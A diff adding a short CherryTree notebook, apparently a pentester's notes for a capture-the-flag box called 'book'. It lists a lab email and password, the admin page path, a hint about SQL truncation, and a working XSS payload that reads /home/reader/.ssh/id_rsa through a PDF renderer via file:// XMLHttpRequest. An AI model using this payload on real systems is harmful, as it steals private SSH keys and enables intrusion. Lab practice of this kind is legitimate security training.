@@ -1,0 +1,16 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="book" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1588282574.64" ts_lastsave="1588282576.86" unique_id="1">
+		<rich_text>kryp@hotmail.com
+ahalol
+
+admin login page: /admin
+admin@book.htb
+
+sqp truncate
+
+pdf local read xss:
+</rich_text>
+		<rich_text weight="heavy">&lt;script&gt;x=new XMLHttpRequest;x.onload=function(){document.write(&quot;&lt;span style=\&quot;font-size: 0.5em\&quot;&gt;&quot;+this.responseText+&quot;&lt;\/span&gt;&quot;)};x.open(&quot;GET&quot;,&quot;file:///home/reader/.ssh/id_rsa&quot;);x.send();&lt;/script&gt;</rich_text>
+	</node>
+</cherrytree>
